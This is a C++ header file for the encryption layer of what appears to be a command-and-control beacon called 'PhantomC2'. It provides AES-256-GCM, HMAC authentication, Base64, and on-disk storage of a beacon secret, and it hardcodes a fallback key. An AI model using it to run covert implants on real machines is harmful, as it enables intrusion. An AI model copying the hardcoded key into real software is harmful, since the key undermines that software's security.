#pragma once
// ============================================================================
//  crypto.h — Phantom Beacon Cryptographic Layer (Cross-Platform)
//  ──────────────────────────────────────────────────────────────────────
//  Authenticated Encryption: AES-256-GCM.
//  Windows: BCrypt native. POSIX: OpenSSL.
// ============================================================================

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <bcrypt.h>
    #include <shlobj.h>
    #pragma comment(lib, "bcrypt.lib")
    #ifndef NT_SUCCESS
    #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
    #endif
    typedef unsigned long ULONG;
#else
    #include <openssl/evp.h>
    #include <openssl/err.h>
    #include <openssl/rand.h>
    #include <openssl/hmac.h>
    typedef unsigned char BYTE;
    typedef unsigned int ULONG;
#endif
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <cstdio>
#include <fstream>
#include <iterator>
#include <utility>
#ifdef _WIN32
#else
    #include <sys/stat.h>
#endif

#if __has_include("beacon_auth.h")
    #include "beacon_auth.h"
#endif
#ifndef BEACON_AUTH_ENABLED
    #define BEACON_AUTH_ENABLED 0
#endif
#ifndef BEACON_MTLS_ENABLED
    #define BEACON_MTLS_ENABLED 0
#endif


namespace crypto {

// ── Key Material ────────────────────────────────────────────────────────────
// If compiling manually, we use these safe defaults. 
// The builder.py will normally provide crypto_config.h.
#if __has_include("crypto_config.h")
    #include "crypto_config.h"
#else
    static const unsigned char AES_KEY[]   = "PhantomC2_SecretKey_32bytes_Long";
    static const unsigned char AES_NONCE[] = "PhntmNonce12";
#endif

constexpr ULONG KEY_LEN   = 32;
constexpr ULONG NONCE_LEN = 12;
constexpr ULONG TAG_LEN   = 16;
constexpr ULONG AUTH_SECRET_LEN = 32;

inline std::string hex_encode(const BYTE* data, size_t length) {
    static const char hex[] = "0123456789abcdef";
    std::string out;
    out.reserve(length * 2);
    for (size_t i = 0; i < length; ++i) {
        out.push_back(hex[(data[i] >> 4) & 0x0F]);
        out.push_back(hex[data[i] & 0x0F]);
    }
    return out;
}

inline std::string random_hex(size_t byte_count) {
    std::vector<BYTE> bytes(byte_count);
#ifdef _WIN32
    if (!NT_SUCCESS(BCryptGenRandom(nullptr, bytes.data(), static_cast<ULONG>(bytes.size()),
                                    BCRYPT_USE_SYSTEM_PREFERRED_RNG))) return "";
#else
    if (RAND_bytes(bytes.data(), static_cast<int>(bytes.size())) != 1) return "";
#endif
    return hex_encode(bytes.data(), bytes.size());
}

inline std::string hmac_sha256_hex(const std::string& message,
                                    const BYTE* secret,
                                    size_t secret_len) {
#if BEACON_AUTH_ENABLED
#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    BYTE digest[32] = {0};
    ULONG digest_len = 0;
    NTSTATUS status = BCryptOpenAlgorithmProvider(
        &hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG);
    if (!NT_SUCCESS(status)) return "";
    status = BCryptCreateHash(hAlg, &hHash, nullptr, 0,
                              const_cast<PUCHAR>(secret),
                              static_cast<ULONG>(secret_len), 0);
    if (NT_SUCCESS(status)) {
        status = BCryptHashData(hHash,
                                reinterpret_cast<PUCHAR>(const_cast<char*>(message.data())),
                                static_cast<ULONG>(message.size()), 0);
    }
    if (NT_SUCCESS(status)) {
        status = BCryptFinishHash(hHash, digest, sizeof(digest), 0);
        digest_len = sizeof(digest);
    }
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return NT_SUCCESS(status) ? hex_encode(digest, digest_len) : "";
#else
    unsigned int digest_len = 0;
    unsigned char digest[EVP_MAX_MD_SIZE] = {0};
    if (!HMAC(EVP_sha256(), secret, static_cast<int>(secret_len),
              reinterpret_cast<const unsigned char*>(message.data()),
              message.size(), digest, &digest_len)) return "";
    return hex_encode(digest, digest_len);
#endif
#else
    (void)message;
    (void)secret;
    (void)secret_len;
    return "";
#endif
}

#if BEACON_AUTH_ENABLED
inline std::string hmac_sha256_hex(const std::string& message) {
    return hmac_sha256_hex(message, BEACON_AUTH_SECRET, AUTH_SECRET_LEN);
}

inline std::string auth_state_path() {
#ifdef _WIN32
    const char* root = getenv("LOCALAPPDATA");
    if (!root) root = getenv("TEMP");
    if (!root) root = ".";
    std::string directory = std::string(root) + "\\\\Phantom";
    CreateDirectoryA(directory.c_str(), nullptr);
    return directory + "\\\\beacon_auth.state";
#else
    const char* home = getenv("HOME");
    if (!home) home = "/tmp";
    std::string directory = std::string(home) + "/.local/state/phantom";
    mkdir((std::string(home) + "/.local").c_str(), 0700);
    mkdir((std::string(home) + "/.local/state").c_str(), 0700);
    mkdir(directory.c_str(), 0700);
    return directory + "/beacon_auth.state";
#endif
}

inline bool save_auth_secret(const BYTE* secret, size_t secret_len) {
    if (!secret || secret_len != AUTH_SECRET_LEN) return false;
#ifdef _WIN32
    DATA_BLOB input{}, protected_blob{};
    input.pbData = const_cast<BYTE*>(secret);
    input.cbData = static_cast<DWORD>(secret_len);
    if (!CryptProtectData(&input, L"Phantom beacon identity", nullptr,
                          nullptr, nullptr, 0, &protected_blob)) return false;
    std::ofstream output(auth_state_path(), std::ios::binary | std::ios::trunc);
    if (!output) {
        LocalFree(protected_blob.pbData);
        return false;
    }
    output.write(reinterpret_cast<const char*>(protected_blob.pbData), protected_blob.cbData);
    bool ok = output.good();
    output.close();
    LocalFree(protected_blob.pbData);
    return ok;
#else
    std::ofstream output(auth_state_path(), std::ios::binary | std::ios::trunc);
    if (!output) return false;
    output.write(reinterpret_cast<const char*>(secret), static_cast<std::streamsize>(secret_len));
    output.close();
    chmod(auth_state_path().c_str(), 0600);
    return output.good();
#endif
}

inline bool load_auth_secret(std::vector<BYTE>& secret) {
    std::ifstream input(auth_state_path(), std::ios::binary);
    if (!input) return false;
    std::vector<BYTE> stored((std::istreambuf_iterator<char>(input)),
                             std::istreambuf_iterator<char>());
#ifdef _WIN32
    DATA_BLOB encrypted{}, plain{};
    encrypted.pbData = stored.data();
    encrypted.cbData = static_cast<DWORD>(stored.size());
    if (!CryptUnprotectData(&encrypted, nullptr, nullptr, nullptr, nullptr,
                            0, &plain)) return false;
    secret.assign(plain.pbData, plain.pbData + plain.cbData);
    LocalFree(plain.pbData);
#else
    secret = std::move(stored);
#endif
    return secret.size() == AUTH_SECRET_LEN;
}
#endif

// ── Base64 Encode/Decode ───────────────────────────────────────────────────

static const char B64_TABLE[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

inline std::string base64_encode(const std::vector<BYTE>& data) {
    std::string out;
    out.reserve(((data.size() + 2) / 3) * 4);
    for (size_t i = 0; i < data.size(); i += 3) {
        uint32_t n = (static_cast<uint32_t>(data[i]) << 16);
        if (i + 1 < data.size()) n |= (static_cast<uint32_t>(data[i + 1]) << 8);
        if (i + 2 < data.size()) n |= static_cast<uint32_t>(data[i + 2]);
        out += B64_TABLE[(n >> 18) & 0x3F];
        out += B64_TABLE[(n >> 12) & 0x3F];
        out += (i + 1 < data.size()) ? B64_TABLE[(n >> 6) & 0x3F] : '=';
        out += (i + 2 < data.size()) ? B64_TABLE[n & 0x3F] : '=';
    }
    return out;
}

inline std::vector<BYTE> base64_decode(const std::string& enc) {
    int T[256];
    memset(T, -1, sizeof(T));
    for (int i = 0; i < 64; ++i) T[static_cast<unsigned char>(B64_TABLE[i])] = i;

    std::vector<BYTE> out;
    out.reserve(enc.size() * 3 / 4);
    uint32_t val = 0;
    int bits = -8;
    for (unsigned char c : enc) {
        if (T[c] == -1) continue;
        val = (val << 6) | T[c];
        bits += 6;
        if (bits >= 0) {
            out.push_back(static_cast<BYTE>((val >> bits) & 0xFF));
            bits -= 8;
        }
    }
    return out;
}

// ── AES-256-GCM Encrypt ────────────────────────────────────────────────────

inline std::string encrypt(const std::string& plaintext) {
#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BYTE nonce[NONCE_LEN];
    BCryptGenRandom(NULL, nonce, NONCE_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    BYTE tag[TAG_LEN];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_LEN;
    authInfo.pbTag = tag;
    authInfo.cbTag = TAG_LEN;
    authInfo.cbData = (ULONG)plaintext.size();

    ULONG cbCiphertext = (ULONG)plaintext.size();
    std::vector<BYTE> ciphertext(cbCiphertext);

    status = BCryptEncrypt(hKey, (PUCHAR)plaintext.data(), (ULONG)plaintext.size(), &authInfo, nullptr, 0, ciphertext.data(), cbCiphertext, &cbCiphertext, 0);
    if (NT_SUCCESS(status)) {
        // Format: nonce || ciphertext || tag (each encryption uses a unique nonce)
        std::vector<BYTE> output;
        output.reserve(NONCE_LEN + cbCiphertext + TAG_LEN);
        output.insert(output.end(), nonce, nonce + NONCE_LEN);
        output.insert(output.end(), ciphertext.begin(), ciphertext.begin() + cbCiphertext);
        output.insert(output.end(), tag, tag + TAG_LEN);
        result = base64_encode(output);
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> ciphertext(plaintext.size());
    std::vector<BYTE> output;
    int len = 0;
    int ciphertext_len = 0;
    BYTE tag[TAG_LEN];
    BYTE nonce[NONCE_LEN];
    if (RAND_bytes(nonce, NONCE_LEN) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }

    do {
        if (1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) break;
        if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) break;
        if (1 != EVP_EncryptInit_ex(ctx, NULL, NULL, AES_KEY, nonce)) break;
        if (1 != EVP_EncryptUpdate(ctx, ciphertext.data(), &len, (const BYTE*)plaintext.data(), plaintext.size())) break;
        ciphertext_len = len;
        if (1 != EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len)) break;
        ciphertext_len += len;
        if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LEN, tag)) break;

        ciphertext.resize(ciphertext_len);
        output.reserve(NONCE_LEN + ciphertext_len + TAG_LEN);
        output.insert(output.end(), nonce, nonce + NONCE_LEN);
        output.insert(output.end(), ciphertext.begin(), ciphertext.end());
        output.insert(output.end(), tag, tag + TAG_LEN);
    } while (0);

    EVP_CIPHER_CTX_free(ctx);
    if (output.empty()) return "";
    return base64_encode(output);
#endif
}

// ── AES-256-GCM Decrypt ────────────────────────────────────────────────────

inline std::string decrypt(const std::string& ciphertext_b64) {
    std::vector<BYTE> full_data = base64_decode(ciphertext_b64);
    if (full_data.size() < NONCE_LEN + TAG_LEN) return "";

    // Extract nonce from the beginning
    BYTE nonce[NONCE_LEN];
    memcpy(nonce, full_data.data(), NONCE_LEN);

    // Extract tag from the end
    BYTE tag[TAG_LEN];
    memcpy(tag, full_data.data() + full_data.size() - TAG_LEN, TAG_LEN);

    // Ciphertext is in the middle
    std::vector<BYTE> ciphertext(full_data.begin() + NONCE_LEN, full_data.end() - TAG_LEN);

#ifdef _WIN32
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;
    std::string result;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!NT_SUCCESS(status)) return "";

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)AES_KEY, KEY_LEN, 0);
    if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = nonce;
    authInfo.cbNonce = NONCE_LEN;
    authInfo.pbTag = tag;
    authInfo.cbTag = TAG_LEN;

    ULONG cbPlaintext = (ULONG)ciphertext.size();
    std::vector<BYTE> plaintext(cbPlaintext);

    status = BCryptDecrypt(hKey, ciphertext.data(), (ULONG)ciphertext.size(), &authInfo, nullptr, 0, plaintext.data(), cbPlaintext, &cbPlaintext, 0);
    if (NT_SUCCESS(status)) {
        result = std::string(plaintext.begin(), plaintext.begin() + cbPlaintext);
    }

    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
#else
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";

    std::vector<BYTE> plaintext(ciphertext.size());
    int len = 0;
    int plaintext_len = 0;
    bool ok = false;

    do {
        if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) break;
        if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, NONCE_LEN, NULL)) break;
        if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, AES_KEY, nonce)) break;
        if (1 != EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), ciphertext.size())) break;
        plaintext_len = len;
        if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LEN, tag)) break;
        // EVP_DecryptFinal_ex returns 0 when the GCM tag does NOT match:
        // the plaintext is unauthenticated garbage and must be discarded.
        if (1 != EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len)) break;
        plaintext_len += len;
        ok = true;
    } while (0);

    EVP_CIPHER_CTX_free(ctx);
    if (!ok || plaintext_len <= 0) return "";
    return std::string(plaintext.begin(), plaintext.begin() + plaintext_len);
#endif
}

}  // namespace crypto
